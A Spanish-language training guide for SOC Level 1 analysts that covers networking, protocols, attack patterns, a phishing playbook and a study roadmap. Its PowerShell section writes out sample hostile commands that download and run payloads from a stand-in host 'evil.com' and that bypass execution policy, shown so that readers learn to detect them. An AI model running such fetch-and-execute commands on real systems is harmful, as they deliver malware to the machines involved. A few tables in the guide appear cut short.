¿Qué es un SOC?

Un Security Operations Center (SOC) — Centro de Operaciones de Seguridad — es una unidad centralizada dentro de una organización responsable de monitorear, detectar, analizar y responder a amenazas e incidentes de ciberseguridad en tiempo real, las 24 horas del día, los 7 días de la semana.

¿Qué hace un Analista SOC L1?

El Analista SOC Nivel 1 es la primera línea de defensa en el SOC. Es responsable de:

  • Revisar y hacer triage (clasificación) de alertas generadas por el SIEM
  • Determinar si una alerta es un verdadero positivo o un falso positivo
  • Documentar los hallazgos en el sistema de tickets
  • Escalar incidentes complejos al Nivel 2 o Nivel 3
  • Monitorear dashboards de seguridad en tiempo real
  • Ejecutar playbooks definidos para tipos de incidentes conocidos
💡 Analogía: El Analista SOC L1 es como el operador de una sala de emergencias: recibe todas las llamadas (alertas), evalúa cuáles son emergencias reales y cuáles son falsas alarmas, y deriva los casos graves al especialista adecuado.

🌐 Fundamentos de Redes

Conocimientos esenciales de networking para el Analista SOC. Desde direcciones IP hasta modelos de referencia.

1.1 Conceptos de Red

IP — Internet Protocol Address

Wireshark tcpdump nmap SIEM

Definición técnica: Identificador numérico único asignado a cada dispositivo en una red que utiliza el protocolo IP para comunicarse. Funciona como la "dirección postal" de un dispositivo en internet o en una red privada.

💡 Explicación simple: Es como el número de tu casa. Sin él, nadie puede enviarte ni recibir información de ti.
Importancia en SOC: Los analistas SOC utilizan direcciones IP para rastrear el origen y destino de conexiones sospechosas, correlacionar actividad maliciosa y aplicar controles como bloqueos.
Ejemplo práctico
Fuente: 192.168.1.50 → Destino: 8.8.8.8 puerto 443
Esto indica una conexión desde una IP interna al DNS de Google por HTTPS.

Tipos de IP

TipoDescripciónEjemplo
PúblicaVisible en internet, asignada por ISP203.0.113.45
PrivadaUso interno, no enrutable en internet192.168.1.1
LoopbackDirección local del propio equipo127.0.0.1
APIPAAuto-asignada cuando no hay DHCP169.254.x.x

Rangos de IP Privadas (RFC 1918)

RFC 1918
Clase A:  10.0.0.0    – 10.255.255.255   (/8)
Clase B:  172.16.0.0  – 172.31.255.255   (/12)
Clase C:  192.168.0.0 – 192.168.255.255  (/16)
⚠️ Riesgos asociados: IP spoofing (suplantación de IP), escaneo de puertos, rastreo de usuarios.

IPv4 — Internet Protocol Version 4

Definición técnica: Cuarta versión del protocolo de internet. Utiliza direcciones de 32 bits representadas en notación decimal separada por puntos (cuatro octetos de 0 a 255).

Estructura IPv4
  192    .   168    .     1    .    10
11000000   10101000   00000001   00001010
(Octeto 1) (Octeto 2) (Octeto 3) (Octeto 4)

Capacidad: 2³² = ~4.300 millones de direcciones únicas.

Importancia en SOC: La mayoría de las redes corporativas actuales aún usan IPv4. Los analistas deben poder leer e interpretar direcciones IPv4 en logs.
Ejemplo de log
Mar 15 09:23:11 firewall DENY src=192.168.10.55 dst=45.33.32.156 dport=22 proto=TCP
→ Intento de conexión SSH desde IP interna a IP externa, bloqueado por firewall.

IPv6 — Internet Protocol Version 6

Definición técnica: Sexta versión del protocolo de internet. Utiliza direcciones de 128 bits representadas en notación hexadecimal separada por dos puntos.

Estructura IPv6
2001:0db8:85a3:0000:0000:8a2e:0370:7334

Capacidad: 2¹²⁸ = ~340 undecillones de direcciones

Abreviación:
Completa:    2001:0db8:0000:0000:0000:0000:0000:0001
Abreviada:   2001:db8::1
🚨 Riesgo real: Organizaciones que no monitorean IPv6 pueden tener un "punto ciego" que los atacantes explotan activamente para tunelizar tráfico. Muchos atacantes utilizan IPv6 para evadir controles configurados solo para IPv4.

MAC Address — Media Access Control Address

Definición técnica: Identificador único de 48 bits asignado a la interfaz de red de un dispositivo por el fabricante. Opera en la Capa 2 del modelo OSI.

Formato MAC
AA:BB:CC:DD:EE:FF
└────────┘ └────────┘
 OUI         NIC Specific
(Fabricante)  (Único del dispositivo)

OUI (Organizationally Unique Identifier) — Ejemplos:
00:50:56 → VMware
00:0C:29 → VMware (VMs)
B8:27:EB → Raspberry Pi Foundation
Ejemplo práctico — Detección de anomalía
DHCP Log:
DHCPACK 192.168.1.105 para MAC 00:0C:29:AB:CD:EF hostname=WORKSTATION-07

→ Si el OUI indica que es una VM (00:0C:29) pero debería ser un equipo físico, 
  podría indicar un atacante usando una máquina virtual para ocultarse.
⚠️ Riesgo: MAC spoofing — un atacante cambia su dirección MAC para suplantar otro dispositivo o evadir controles de acceso a red (NAC).

Subnetting — Subredes

Definición técnica: Proceso de dividir una red IP en redes más pequeñas (subredes) usando máscaras de subred. Permite organizar y segmentar la red para mejorar rendimiento y seguridad.

Componentes de una subred
Dirección de red:  192.168.1.0
Máscara de subred: 255.255.255.0  (/24)
Rango usable:      192.168.1.1 – 192.168.1.254
Broadcast:         192.168.1.255
Total hosts:       254

Tabla de Máscaras Comunes

CIDRMáscaraHosts usablesUso típico
/8255.0.0.016,777,214Clase A
/16255.255.0.065,534Clase B
/24255.255.255.0254Red de oficina típica
/28255.255.255.24014Segmento pequeño (DMZ)
/30255.255.255.2522Enlace punto a punto
/32255.255.255.2551Host específico
Ejemplo SOC — Movimiento lateral
Alerta: 10.20.30.55 intentó conectarse a 10.20.50.10
→ Ambas IPs son internas pero en subredes distintas (30.x vs 50.x)
→ Esto puede indicar movimiento lateral entre segmentos de red
→ Requiere investigación de por qué un equipo del segmento 30 contacta al 50

Gateway (Puerta de Enlace)

Definición técnica: Dispositivo de red (generalmente un router) que actúa como punto de salida de una red local hacia otras redes, incluyendo internet.

Ejemplo
Red local: 192.168.1.0/24
Gateway:   192.168.1.1 (router/firewall)
Si un host quiere salir a internet, el tráfico pasa por 192.168.1.1
Importancia en SOC: El gateway (normalmente el firewall) es el primer y último punto de control del tráfico. Sus logs son fundamentales para el monitoreo SOC.

NAT — Network Address Translation

Definición técnica: Técnica que permite traducir direcciones IP privadas a una dirección IP pública para comunicarse con internet, y viceversa.

TipoDescripciónUso
Static NAT1 IP privada → 1 IP pública fijaServidores expuestos
Dynamic NATPool de IPs públicas asignadas dinámicamenteEntornos empresariales
PAT/OverloadMúltiples IPs privadas → 1 IP pública (con puertos)Hogar/empresa típica
Log NAT
[NAT] 192.168.1.100:54321 → 203.0.113.10:80 traducido a 198.51.100.5:54321
ℹ️ Nota SOC: NAT puede dificultar el rastreo de origen de ataques ya que múltiples usuarios pueden compartir una IP pública. Los logs de NAT son críticos para correlacionar.

Alertas DNS comunes en SOC

Patrones de ataque DNS
1. DNS Tunneling:     consultas DNS anormalmente largas o frecuentes
2. DGA (Domain Gen):  dominios generados algorítmicamente (abc123xyz.ru)
3. Fast Flux:         IP cambia cada pocos segundos para el mismo dominio
4. Typosquatting:     micros0ft.com en vez de microsoft.com
5. C2 over DNS:       malware usa DNS para recibir comandos del atacante
🚨 Riesgos: DNS hijacking, DNS poisoning, DNS tunneling, DGA malware.

DHCP — Dynamic Host Configuration Protocol

Definición técnica: Protocolo cliente-servidor que asigna automáticamente configuración de red (IP, máscara, gateway, DNS) a los dispositivos cuando se conectan.

Puerto: UDP/67 (servidor), UDP/68 (cliente)

Proceso DORA

DDISCOVER

Cliente envía broadcast buscando servidor DHCP

OOFFER

Servidor ofrece una IP disponible

RREQUEST

Cliente solicita la IP ofrecida

AACK

Servidor confirma la asignación

Ejemplo de log DHCP (Windows)
15/03/2024 09:23:45 Assign     192.168.1.105  WORKSTATION-07  00:0C:29:AB:CD:EF
15/03/2024 09:23:45 DNS Update  workstation-07.corp.local  192.168.1.105

VLAN — Virtual Local Area Network

Definición técnica: Segmentación lógica de una red física que permite crear redes virtuales independientes dentro del mismo hardware.

Ejemplo de segmentación
VLAN 10 - Empleados:       192.168.10.0/24
VLAN 20 - Servidores:      192.168.20.0/24
VLAN 30 - Invitados:       192.168.30.0/24
VLAN 40 - IoT/Cámaras:     192.168.40.0/24
VLAN 99 - Management:      192.168.99.0/24
⚠️ Riesgo: VLAN hopping — técnica donde un atacante consigue acceder a otra VLAN usando ataques como double tagging.

CIDR — Classless Inter-Domain Routing

Definición técnica: Método de asignación y notación de direcciones IP que reemplaza el sistema antiguo de clases A/B/C. Usa una barra diagonal seguida del número de bits de la máscara de red.

Uso en SOC
# Bloquear todo el rango de una ASN maliciosa
block src 45.33.0.0/16

# Consulta SIEM para ver tráfico de un rango
source_ip BETWEEN 10.20.30.0/24

ARP — Address Resolution Protocol

ALTO RIESGO

Definición técnica: Protocolo que resuelve direcciones IP (Capa 3) a direcciones MAC (Capa 2) dentro de una misma red local.

Funcionamiento ARP
PC-A quiere hablar con 192.168.1.10:
1. ARP Request (broadcast): "¿Quién tiene 192.168.1.10? Cuéntaselo a 192.168.1.5"
2. ARP Reply (unicast): "192.168.1.10 está en MAC AA:BB:CC:DD:EE:FF"
3. PC-A guarda en tabla ARP: 192.168.1.10 → AA:BB:CC:DD:EE:FF
🚨 Riesgo crítico — ARP Spoofing/Poisoning (MITM):
Escenario MITM via ARP Spoofing
Atacante envía ARP gratuitos falsos:
- A Víctima: "La IP del Gateway (.1) es MI MAC"
- Al Gateway: "La IP de Víctima es MI MAC"
Resultado: Todo el tráfico pasa por el atacante

Detección en SOC:
- IP duplicada en tabla ARP
- MAC address cambiando frecuentemente para misma IP
- Herramienta: arpwatch, XArp

TCP/IP — Transmission Control Protocol / Internet Protocol

Definición técnica: Suite de protocolos que forman la base de internet. TCP proporciona comunicación confiable orientada a conexión; IP proporciona el direccionamiento y enrutamiento.

Three-Way Handshake TCP

Cliente        Servidor
   │                │
   │──── SYN ──────▶│  "Quiero conectarme"
   │                │
   │◀─── SYN-ACK ───│  "De acuerdo, listo"
   │                │
   │──── ACK ──────▶│  "Confirmado, conectados"
   │                │
   [Conexión establecida]

Flags TCP

FlagNombreUso

Patrones anómalos de TCP
SYN flood:   Muchos SYN sin respuesta ACK → DDoS
Port scan:   SYN a múltiples puertos → Reconocimiento
XMAS scan:   FIN+PSH+URG → Evasión de firewall
NULL scan:   Sin flags → Evasión de firewall

TCP — Transmission Control Protocol

Protocolo de transporte orientado a la conexión que garantiza la entrega ordenada y sin errores de los datos.

  • Orientado a conexión (stateful)
  • Entrega garantizada y ordenada
  • Control de flujo y congestión
  • Más lento que UDP pero confiable
Ataques TCP
SYN Flood:      Enviar miles de SYN sin completar handshake → agota recursos
TCP Hijacking:  Secuestrar sesión TCP mediante predicción de secuencia
RST Attack:     Enviar RST falso para terminar conexiones legítimas

UDP — User Datagram Protocol

Protocolo de transporte sin conexión que envía datagramas sin garantía de entrega, orden o integridad. Más rápido que TCP pero menos confiable.

Usos típicos: DNS, DHCP, NTP, streaming de video, juegos online, VoIP.

Ataques UDP
UDP Flood:         Enviar grandes volúmenes de paquetes UDP → saturar ancho de banda
UDP Amplification: Usar servidores UDP (DNS, NTP) para amplificar ataques DDoS
                   Ejemplo: NTP amplification hasta 556x el volumen original

HTTPS — HTTP Secure

Puerto 443 Cifrado TLS

Versión cifrada de HTTP que utiliza TLS para cifrar la comunicación entre cliente y servidor.

⚠️ ALERTA: Malware moderno usa HTTPS para cifrar comunicaciones C2. El cifrado NO es sinónimo de "seguro". Los analistas pueden analizar metadatos: IP destino, SNI, tamaño de paquetes, certificados autofirmados.

FTP — File Transfer Protocol

Puerto 21 (control) Puerto 20 (datos) Sin cifrado

Riesgos FTP
1. Credenciales en texto claro → capturables con Wireshark
2. FTP bounce attack → usar servidor FTP para escanear terceros
3. Anonymous FTP → acceso sin credenciales si mal configurado
Detección en SOC
Alerta: Transferencia FTP desde servidor interno hacia IP externa desconocida
Volumen: 500MB en 10 minutos
→ Posible exfiltración de datos

SSH — Secure Shell

Puerto 22 Cifrado

Ataques SSH
1. Brute force:    Intentar miles de combinaciones usuario/contraseña
2. SSH tunneling:  Tunelizar tráfico malicioso a través de SSH
3. SSH key abuse:  Robar claves privadas SSH para acceso persistente
4. Port forwarding: Exponer servicios internos al exterior
Ejemplo de alerta brute force SSH
Fuente: 45.55.60.70
Destino: 10.0.0.5 TCP/22
Intentos: 1,547 en 5 minutos
Usuarios probados: root, admin, test, ubuntu, oracle...

RDP — Remote Desktop Protocol

ALTO RIESGO

Puerto 3389 TCP

Riesgos RDP
1. BlueKeep (CVE-2019-0708): RCE sin autenticación en RDP
2. Brute force:              Intentar credenciales por fuerza bruta
3. RDP spraying:             Una contraseña, muchos usuarios

Kerberos

CRÍTICO PARA SOC

Puerto 88 TCP/UDP

Componentes Kerberos
KDC (Key Distribution Center):
├── AS (Authentication Service):  Emite TGT
└── TGS (Ticket Granting Service): Emite Service Tickets

TGT (Ticket Granting Ticket): Ticket de autenticación inicial (válido ~10h)
Service Ticket (ST):          Ticket para acceder a un servicio específico
1. Usuario → KDC AS:  "Dame un TGT" (con hash de contraseña)
2. KDC AS → Usuario:  TGT cifrado + Session Key
3. Usuario → KDC TGS: "Dame ticket para Servicio X" (con TGT)
4. KDC TGS → Usuario: Service Ticket
5. Usuario → Servicio: "Accede" (con Service Ticket)

Ataques Kerberos críticos para SOC

AtaqueDescripciónDetección
KerberoastingSolicitar Service Ticket para cuentas de servicio y crackear offlineMuchas solicitudes TGS, Event 4769

PowerShell

HERRAMIENTA FAVORITA DE ATACANTES
Importancia en SOC: PowerShell es la herramienta preferida de los atacantes ("living off the land") porque viene instalado en todos los Windows, puede acceder a APIs del sistema, y puede descargar y ejecutar código en memoria sin tocar disco.

Técnicas Maliciosas de PowerShell

Técnicas de ataque PowerShell
# Descarga y ejecución en memoria (fileless)
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')

# Comando codificado en Base64 para evadir detección
powershell.exe -enc JABjAGwAaQBlAG4AdAA=...

# Bypass de ExecutionPolicy
powershell.exe -ExecutionPolicy Bypass -File malware.ps1

# Descarga usando BITS
Start-BitsTransfer -Source http://evil.com/mal.exe -Destination C:\temp\mal.exe

Detección de PowerShell Malicioso

Indicadores de PowerShell malicioso
1. -EncodedCommand o -enc → obfuscación
2. -ExecutionPolicy Bypass → evadir restricciones
3. IEX o Invoke-Expression → ejecutar código dinámico
4. DownloadString/WebClient → descargar desde internet
5. Parent process = Word, Excel, cmd.exe
6. Proceso de red desde powershell.exe
7. ScriptBlock logging: Event ID 4104

SUID / SGID / Sticky Bit

Permisos especiales
SUID (4xxx): Ejecutar con permisos del propietario
  chmod u+s /usr/bin/programa → -rwsr-xr-x
  RIESGO: Si un binario SUID pertenece a root → escalación de privilegios

SGID (2xxx): Ejecutar con permisos del grupo
  chmod g+s /directorio

Sticky Bit (1xxx): Solo el propietario puede borrar
  chmod +t /tmp → drwxrwxrwt

🔒 Ciberseguridad Básica

Conceptos fundamentales de seguridad informática: CIA Triad, tipos de ataques, malware, criptografía y más.

Tríada CIA — Confidentiality, Integrity, Availability

CConfidencialidad

Que la información solo sea accesible por personas autorizadas. Controles: cifrado, ACLs, MFA.

IIntegridad

Que la información no sea alterada sin autorización. Controles: hashing, firmas digitales, checksums.

ADisponibilidad

Que la información y servicios estén accesibles cuando se necesiten. Controles: redundancia, backups, DDoS protection.

Playbook: Phishing (Ejemplo L1)

Playbook de Phishing
PASO 1: Recibir alerta de email sospechoso
PASO 2: Analizar headers del email
  - Verificar From vs Return-Path
  - Comprobar SPF, DKIM, DMARC
PASO 3: Examinar URLs
  - Usar VirusTotal / URLScan.io
  - No hacer clic directamente
PASO 4: Examinar adjuntos
  - Hash → VirusTotal
  - Sandbox: any.run, hybrid-analysis
PASO 5: Determinar alcance
  - ¿Cuántos usuarios recibieron el email?
  - ¿Alguien hizo clic?
PASO 6: Contención
  - Bloquear remitente en gateway
  - Eliminar email de todos los buzones
  - Reset de credenciales si hubo clic
PASO 7: Documentar y escalar si necesario
PASO 8: Actualizar reglas de detección

🗺️ Ruta de Aprendizaje SOC L1

Plan de estudio progresivo para convertirte en Analista SOC Nivel 1. De cero a operacional.

Fase 1 — Fundamentos (Meses 1-2)

📚Redes

TCP/IP, DNS, DHCP, subnetting, protocolos principales

💻Sistemas Operativos

Windows: AD, Event Logs, PowerShell | Linux: permisos, logs, CLI

🔐Seguridad Básica

CIA Triad, tipos de ataques, malware, criptografía básica

Certificación recomendada: CompTIA Security+ (SY0-701)

Fase 2 — Herramientas SOC (Meses 3-4)

📊SIEM

Splunk Free, Wazuh, o Elastic SIEM. Aprender queries y correlación

🔍Análisis de Logs

Windows Event Logs, Sysmon, firewall logs, proxy logs

🌐Análisis de Red

Wireshark, tcpdump, análisis de PCAP

Certificación recomendada: Microsoft SC-200 o CompTIA CySA+

Fase 3 — Práctica y Especialización (Meses 5-6)

🧪Laboratorios

TryHackMe SOC Path, LetsDefend, CyberDefenders

📐Frameworks

MITRE ATT&CK, Cyber Kill Chain, NIST IR

📝Documentación

Practicar escritura de reportes de incidentes, timeline, IoCs

Meta: Aplicar a posiciones SOC L1 / Junior Security Analyst
